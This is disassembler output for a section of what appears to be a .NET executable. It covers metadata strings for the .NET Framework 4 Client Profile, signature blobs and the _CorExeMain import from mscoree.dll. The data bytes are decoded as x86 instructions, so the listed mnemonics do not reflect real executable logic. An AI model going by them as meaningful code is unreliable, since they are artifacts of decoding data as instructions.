  40c1e1:	2c 56                	sub    $0x56,%al
  40c1e3:	65 72 73             	gs jb  0x40c259
  40c1e6:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40c1ed:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40c1f0:	72 6f                	jb     0x40c261
  40c1f2:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40c1f9:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40c200:	0e                   	push   %cs
  40c201:	14 46                	adc    $0x46,%al
  40c203:	72 61                	jb     0x40c266
  40c205:	6d                   	insl   (%dx),%es:(%edi)
  40c206:	65 77 6f             	gs ja  0x40c278
  40c209:	72 6b                	jb     0x40c276
  40c20b:	44                   	inc    %esp
  40c20c:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40c213:	61                   	popa
  40c214:	6d                   	insl   (%dx),%es:(%edi)
  40c215:	65 1f                	gs pop %ds
  40c217:	2e 4e                	cs dec %esi
  40c219:	45                   	inc    %ebp
  40c21a:	54                   	push   %esp
  40c21b:	20 46 72             	and    %al,0x72(%esi)
  40c21e:	61                   	popa
  40c21f:	6d                   	insl   (%dx),%es:(%edi)
  40c220:	65 77 6f             	gs ja  0x40c292
  40c223:	72 6b                	jb     0x40c290
  40c225:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40c228:	43                   	inc    %ebx
  40c229:	6c                   	insb   (%dx),%es:(%edi)
  40c22a:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40c231:	6f                   	outsl  %ds:(%esi),(%dx)
  40c232:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40c239:	04 49                	add    $0x49,%al
  40c23b:	74 65                	je     0x40c2a2
  40c23d:	6d                   	insl   (%dx),%es:(%edi)
  40c23e:	00 00                	add    %al,(%eax)
  40c240:	03 07                	add    (%edi),%eax
  40c242:	01 08                	add    %ecx,(%eax)
  40c244:	04 00                	add    $0x0,%al
  40c246:	01 08                	add    %ecx,(%eax)
  40c248:	0e                   	push   %cs
  40c249:	03 07                	add    (%edi),%eax
  40c24b:	01 02                	add    %eax,(%edx)
  40c24d:	05 00 00 12 80       	add    $0x80120000,%eax
  40c252:	b1 05                	mov    $0x5,%cl
  40c254:	20 01                	and    %al,(%ecx)
  40c256:	0e                   	push   %cs
  40c257:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40c25c:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40c262:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40c268:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40c26d:	03 02                	add    (%edx),%eax
  40c26f:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40c274:	14 07                	adc    $0x7,%al
  40c276:	08 0e                	or     %cl,(%esi)
  40c278:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40c27e:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40c284:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40c28a:	20 03                	and    %al,(%ebx)
  40c28c:	01 11                	add    %edx,(%ecx)
  40c28e:	80 d5 11             	adc    $0x11,%ch
  40c291:	80 d9 11             	sbb    $0x11,%cl
  40c294:	80 dd 05             	sbb    $0x5,%ch
  40c297:	00 02                	add    %al,(%edx)
  40c299:	02 0e                	add    (%esi),%cl
  40c29b:	0e                   	push   %cs
  40c29c:	06                   	push   %es
  40c29d:	20 01                	and    %al,(%ecx)
  40c29f:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40c2a4:	20 01                	and    %al,(%ecx)
  40c2a6:	08 08                	or     %cl,(%eax)
  40c2a8:	07                   	pop    %es
  40c2a9:	00 01                	add    %al,(%ecx)
  40c2ab:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
  40c2b0:	07                   	pop    %es
  40c2b1:	20 02                	and    %al,(%edx)
  40c2b3:	01 12                	add    %edx,(%edx)
  40c2b5:	80 c9 08             	or     $0x8,%cl
  40c2b8:	06                   	push   %es
  40c2b9:	20 01                	and    %al,(%ecx)
  40c2bb:	01 12                	add    %edx,(%edx)
  40c2bd:	80 f1 09             	xor    $0x9,%cl
  40c2c0:	20 02                	and    %al,(%edx)
  40c2c2:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40c2c7:	80 f5 05             	xor    $0x5,%ch
  40c2ca:	20 02                	and    %al,(%edx)
  40c2cc:	08 08                	or     %cl,(%eax)
  40c2ce:	08 06                	or     %al,(%esi)
  40c2d0:	20 02                	and    %al,(%edx)
  40c2d2:	01 12                	add    %edx,(%edx)
  40c2d4:	0d 02 05 20 02       	or     $0x2200502,%eax
  40c2d9:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40c2dc:	09 20                	or     %esp,(%eax)
  40c2de:	03 01                	add    (%ecx),%eax
  40c2e0:	12 61 02             	adc    0x2(%ecx),%ah
  40c2e3:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40c2e9:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40c2ef:	01 0e                	add    %ecx,(%esi)
  40c2f1:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40c2f7:	02 09                	add    (%ecx),%cl
  40c2f9:	20 04 01             	and    %al,(%ecx,%eax,1)
  40c2fc:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40c302:	0c 20                	or     $0x20,%al
  40c304:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40c309:	08 08                	or     %cl,(%eax)
  40c30b:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40c311:	01 11                	add    %edx,(%ecx)
  40c313:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40c319:	02 12                	add    (%edx),%dl
  40c31b:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40c31e:	02 08                	add    (%eax),%cl
  40c320:	08 05 20 01 08 12    	or     %al,0x12080120
  40c326:	25 06 00 02 08       	and    $0x8020006,%eax
  40c32b:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40c330:	03 08                	add    (%eax),%ecx
  40c332:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40c337:	20 01                	and    %al,(%ecx)
  40c339:	01 12                	add    %edx,(%edx)
  40c33b:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40c341:	1c 0c                	sbb    $0xc,%al
  40c343:	07                   	pop    %es
  40c344:	06                   	push   %es
  40c345:	1c 02                	sbb    $0x2,%al
  40c347:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40c34c:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40c352:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40c355:	02 07                	add    (%edi),%al
  40c357:	20 02                	and    %al,(%edx)
  40c359:	02 08                	add    (%eax),%cl
  40c35b:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40c361:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40c367:	07                   	pop    %es
  40c368:	0a 12                	or     (%edx),%dl
  40c36a:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40c371:	08 12 81 
  40c374:	41                   	inc    %ecx
  40c375:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40c37b:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40c380:	4d                   	dec    %ebp
  40c381:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c386:	0e                   	push   %cs
  40c387:	05 00 00 12 81       	add    $0x81120000,%eax
  40c38c:	41                   	inc    %ecx
  40c38d:	05 20 00 12 81       	add    $0x81120020,%eax
  40c392:	55                   	push   %ebp
  40c393:	06                   	push   %es
  40c394:	00 00                	add    %al,(%eax)
  40c396:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40c39b:	00 01                	add    %al,(%ecx)
  40c39d:	0e                   	push   %cs
  40c39e:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40c3a3:	01 11                	add    %edx,(%ecx)
  40c3a5:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40c3ac:	41                   	inc    %ecx
  40c3ad:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40c3b3:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40c3ba:	49                   	dec    %ecx
  40c3bb:	0e                   	push   %cs
  40c3bc:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40c3c2:	0e                   	push   %cs
  40c3c3:	0e                   	push   %cs
  40c3c4:	0e                   	push   %cs
  40c3c5:	0e                   	push   %cs
  40c3c6:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c3cb:	1c 07                	sbb    $0x7,%al
  40c3cd:	20 02                	and    %al,(%edx)
  40c3cf:	01 0e                	add    %ecx,(%esi)
  40c3d1:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40c3d7:	0a 02                	or     (%edx),%al
  40c3d9:	10 07                	adc    %al,(%edi)
  40c3db:	06                   	push   %es
  40c3dc:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40c3e2:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40c3e8:	0e                   	push   %cs
  40c3e9:	02 05 20 00 12 81    	add    0x81120020,%al
  40c3ef:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40c3f5:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40c3fb:	91                   	xchg   %eax,%ecx
  40c3fc:	04 20                	add    $0x20,%al
  40c3fe:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40c401:	04 07                	add    $0x7,%al
  40c403:	02 02                	add    (%edx),%al
  40c405:	02 03                	add    (%ebx),%al
  40c407:	20 00                	and    %al,(%eax)
  40c409:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40c40c:	02 18                	add    (%eax),%bl
  40c40e:	02 03                	add    (%ebx),%al
  40c410:	07                   	pop    %es
  40c411:	01 0e                	add    %ecx,(%esi)
  40c413:	05 00 00 12 81       	add    $0x81120000,%eax
  40c418:	9d                   	popf
  40c419:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c41e:	1c 0a                	sbb    $0xa,%al
  40c420:	07                   	pop    %es
  40c421:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40c426:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40c42b:	20 01                	and    %al,(%ecx)
  40c42d:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40c433:	0e                   	push   %cs
  40c434:	08 08                	or     %cl,(%eax)
  40c436:	06                   	push   %es
  40c437:	07                   	pop    %es
  40c438:	02 02                	add    (%edx),%al
  40c43a:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40c440:	0e                   	push   %cs
  40c441:	0e                   	push   %cs
  40c442:	0e                   	push   %cs
  40c443:	05 20 00 11 81       	add    $0x81110020,%eax
  40c448:	ad                   	lods   %ds:(%esi),%eax
  40c449:	05 00 00 12 81       	add    $0x81120000,%eax
  40c44e:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40c453:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40c459:	02 11                	add    (%ecx),%dl
  40c45b:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40c461:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40c468:	12 81 8d 
  40c46b:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40c471:	12 41 01             	adc    0x1(%ecx),%al
  40c474:	0e                   	push   %cs
  40c475:	05 20 01 01 13       	add    $0x13010120,%eax
  40c47a:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40c480:	00 06                	add    %al,(%esi)
  40c482:	00 02                	add    %al,(%edx)
  40c484:	0e                   	push   %cs
  40c485:	0e                   	push   %cs
  40c486:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40c48b:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40c490:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40c496:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40c49c:	c5 09                	lds    (%ecx),%ecx
  40c49e:	00 02                	add    %al,(%edx)
  40c4a0:	02 11                	add    (%ecx),%dl
  40c4a2:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40c4a8:	07                   	pop    %es
  40c4a9:	02 12                	add    (%edx),%dl
  40c4ab:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40c4b0:	01 02                	add    %eax,(%edx)
  40c4b2:	0e                   	push   %cs
  40c4b3:	10 02                	adc    %al,(%edx)
  40c4b5:	06                   	push   %es
  40c4b6:	00 01                	add    %al,(%ecx)
  40c4b8:	01 12                	add    %edx,(%edx)
  40c4ba:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40c4c0:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40c4c7:	0e                   	push   %cs
  40c4c8:	1c 11                	sbb    $0x11,%al
  40c4ca:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40c4d0:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40c4d7:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40c4dd:	05 07 20 02 12       	add    $0x12022007,%eax
  40c4e2:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40c4e9:	12 60 0e             	adc    0xe(%eax),%ah
  40c4ec:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c4f1:	12 60 12             	adc    0x12(%eax),%ah
  40c4f4:	60                   	pusha
  40c4f5:	06                   	push   %es
  40c4f6:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c4fb:	60                   	pusha
  40c4fc:	10 10                	adc    %dl,(%eax)
  40c4fe:	01 01                	add    %eax,(%ecx)
  40c500:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40c505:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40c50b:	1e                   	push   %ds
  40c50c:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c50f:	01 12                	add    %edx,(%edx)
  40c511:	60                   	pusha
  40c512:	09 20                	or     %esp,(%eax)
  40c514:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40c51a:	13 00                	adc    (%eax),%eax
  40c51c:	07                   	pop    %es
  40c51d:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c522:	12 60 04             	adc    0x4(%eax),%ah
  40c525:	20 00                	and    %al,(%eax)
  40c527:	13 00                	adc    (%eax),%eax
  40c529:	05 20 01 02 13       	add    $0x13020120,%eax
  40c52e:	00 03                	add    %al,(%ebx)
  40c530:	07                   	pop    %es
  40c531:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40c538:	e5 07                	in     $0x7,%eax
  40c53a:	20 01                	and    %al,(%ecx)
  40c53c:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40c542:	20 01                	and    %al,(%ecx)
  40c544:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40c54a:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c54d:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40c553:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40c559:	00 02                	add    %al,(%edx)
  40c55b:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40c561:	0e                   	push   %cs
  40c562:	1c 00                	sbb    $0x0,%al
  40c564:	05 12 82 05 11       	add    $0x11058212,%eax
  40c569:	82 09 0e             	orb    $0xe,(%ecx)
  40c56c:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c571:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40c577:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c57c:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40c582:	45                   	inc    %ebp
  40c583:	01 15 12 49 0a 12    	add    %edx,0x120a4912
  40c589:	4d                   	dec    %ebp
  40c58a:	1c 12                	sbb    $0x12,%al
  40c58c:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c591:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c596:	0e                   	push   %cs
  40c597:	0b 00                	or     (%eax),%eax
  40c599:	01 15 12 45 01 13    	add    %edx,0x13014512
  40c59f:	00 12                	add    %dl,(%edx)
  40c5a1:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40c5a8:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40c5ad:	4d                   	dec    %ebp
  40c5ae:	1c 12                	sbb    $0x12,%al
  40c5b0:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c5b5:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c5ba:	0e                   	push   %cs
  40c5bb:	17                   	pop    %ss
  40c5bc:	20 0a                	and    %cl,(%edx)
  40c5be:	01 13                	add    %edx,(%ebx)
  40c5c0:	00 13                	add    %dl,(%ebx)
  40c5c2:	01 13                	add    %edx,(%ebx)
  40c5c4:	02 13                	add    (%ebx),%dl
  40c5c6:	03 13                	add    (%ebx),%edx
  40c5c8:	04 13                	add    $0x13,%al
  40c5ca:	05 13 06 13 07       	add    $0x7130613,%eax
  40c5cf:	13 08                	adc    (%eax),%ecx
  40c5d1:	13 09                	adc    (%ecx),%ecx
  40c5d3:	05 07 01 12 82       	add    $0x82120107,%eax
  40c5d8:	0d 07 20 03 01       	or     $0x1032007,%eax
  40c5dd:	0e                   	push   %cs
  40c5de:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40c5e3:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40c5e9:	06                   	push   %es
  40c5ea:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40c5f0:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40c5f6:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40c5fb:	20 01                	and    %al,(%ecx)
  40c5fd:	01 11                	add    %edx,(%ecx)
  40c5ff:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40c606:	82 31 05             	xorb   $0x5,(%ecx)
  40c609:	20 00                	and    %al,(%eax)
  40c60b:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40c611:	01 12                	add    %edx,(%edx)
  40c613:	61                   	popa
  40c614:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40c61a:	08 20                	or     %ah,(%eax)
  40c61c:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40c622:	08 1a                	or     %bl,(%edx)
  40c624:	07                   	pop    %es
  40c625:	0a 12                	or     (%edx),%dl
  40c627:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40c62e:	21 1d 05 
  40c631:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40c636:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40c63d:	05 0c 00 05 01       	add    $0x105000c,%eax
  40c642:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40c648:	45                   	inc    %ebp
  40c649:	08 08                	or     %cl,(%eax)
  40c64b:	04 07                	add    $0x7,%al
  40c64d:	02 02                	add    (%edx),%al
  40c64f:	08 09                	or     %cl,(%ecx)
  40c651:	00 02                	add    %al,(%edx)
  40c653:	01 12                	add    %edx,(%edx)
  40c655:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40c659:	4d                   	dec    %ebp
  40c65a:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40c65f:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40c665:	05 08 05 07 07       	add    $0x7070508,%eax
  40c66a:	02 12                	add    (%edx),%dl
  40c66c:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40c670:	08 07                	or     %al,(%edi)
  40c672:	04 12                	add    $0x12,%al
  40c674:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40c679:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c67e:	1c 06                	sbb    $0x6,%al
  40c680:	07                   	pop    %es
  40c681:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  40c687:	20 01                	and    %al,(%ecx)
  40c689:	13 00                	adc    (%eax),%eax
  40c68b:	08 04 07             	or     %al,(%edi,%eax,1)
  40c68e:	01 12                	add    %edx,(%edx)
  40c690:	60                   	pusha
  40c691:	0e                   	push   %cs
  40c692:	07                   	pop    %es
  40c693:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40c698:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40c69e:	12 60 07             	adc    0x7(%eax),%ah
  40c6a1:	07                   	pop    %es
  40c6a2:	04 08                	add    $0x8,%al
  40c6a4:	05 1d 05 08 04       	add    $0x408051d,%eax
  40c6a9:	20 01                	and    %al,(%ecx)
  40c6ab:	01 05 04 07 01 11    	add    %eax,0x11010704
  40c6b1:	64 04 00             	fs add $0x0,%al
  40c6b4:	01 0b                	add    %ecx,(%ebx)
  40c6b6:	0a 04 00             	or     (%eax,%eax,1),%al
  40c6b9:	01 0b                	add    %ecx,(%ebx)
  40c6bb:	0e                   	push   %cs
  40c6bc:	04 00                	add    $0x0,%al
  40c6be:	01 0b                	add    %ecx,(%ebx)
  40c6c0:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40c6c5:	0c 06                	or     $0x6,%al
  40c6c7:	00 01                	add    %al,(%ecx)
  40c6c9:	0b 11                	or     (%ecx),%edx
  40c6cb:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40c6d2:	04 00 01 
  40c6d5:	0a 0e                	or     (%esi),%cl
  40c6d7:	04 00                	add    $0x0,%al
  40c6d9:	01 0a                	add    %ecx,(%edx)
  40c6db:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40c6e0:	0c 06                	or     $0x6,%al
  40c6e2:	00 01                	add    %al,(%ecx)
  40c6e4:	0a 11                	or     (%ecx),%dl
  40c6e6:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40c6ed:	04 00 01 
  40c6f0:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40c6f5:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40c6f9:	ad                   	lods   %ds:(%esi),%eax
  40c6fa:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40c6ff:	0c 07                	or     $0x7,%al
  40c701:	07                   	pop    %es
  40c702:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40c708:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40c70d:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
  40c713:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40c719:	12 60 1d             	adc    0x1d(%eax),%ah
  40c71c:	0e                   	push   %cs
  40c71d:	0e                   	push   %cs
  40c71e:	08 12                	or     %dl,(%edx)
  40c720:	60                   	pusha
  40c721:	08 05 07 01 12 81    	or     %al,0x81120107
  40c727:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40c72c:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
  40c733:	05 08 08 06 00       	add    $0x60808,%eax
  40c738:	02 07                	add    (%edi),%al
  40c73a:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c73f:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40c746:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40c74c:	00 02                	add    %al,(%edx)
  40c74e:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40c754:	02 0b                	add    (%ebx),%cl
  40c756:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c75b:	02 06                	add    (%esi),%al
  40c75d:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c762:	02 0a                	add    (%edx),%cl
  40c764:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40c769:	03 12                	add    (%edx),%edx
  40c76b:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40c772:	07 02 12 
  40c775:	60                   	pusha
  40c776:	02 04 07             	add    (%edi,%eax,1),%al
  40c779:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40c77f:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40c784:	04 1d                	add    $0x1d,%al
  40c786:	05 1d 05 08 05       	add    $0x508051d,%eax
  40c78b:	06                   	push   %es
  40c78c:	07                   	pop    %es
  40c78d:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40c793:	00 01                	add    %al,(%ecx)
  40c795:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40c79a:	06                   	push   %es
  40c79b:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40c7a1:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40c7a7:	05 08 20 02 01       	add    $0x1022008,%eax
  40c7ac:	12 61 11             	adc    0x11(%ecx),%ah
  40c7af:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40c7b3:	04 12                	add    $0x12,%al
  40c7b5:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40c7bc:	1d 05 00 
  40c7bf:	00 e8                	add    %ch,%al
  40c7c1:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  40c7c7:	00 00                	add    %al,(%eax)
  40c7c9:	00 00                	add    %al,(%eax)
  40c7cb:	00 fe                	add    %bh,%dh
  40c7cd:	c7 00 00 00 20 00    	movl   $0x200000,(%eax)
	...
  40c7e7:	00 f0                	add    %dh,%al
  40c7e9:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  40c7ef:	00 00                	add    %al,(%eax)
  40c7f1:	00 5f 43             	add    %bl,0x43(%edi)
  40c7f4:	6f                   	outsl  %ds:(%esi),(%dx)
  40c7f5:	72 45                	jb     0x40c83c
  40c7f7:	78 65                	js     0x40c85e
  40c7f9:	4d                   	dec    %ebp
  40c7fa:	61                   	popa
  40c7fb:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40c802:	72 65                	jb     0x40c869
  40c804:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40c808:	6c                   	insb   (%dx),%es:(%edi)
  40c809:	00 00                	add    %al,(%eax)
  40c80b:	00 00                	add    %al,(%eax)
  40c80d:	00 ff                	add    %bh,%bh
  40c80f:	25 00 20 40 00       	and    $0x402000,%eax
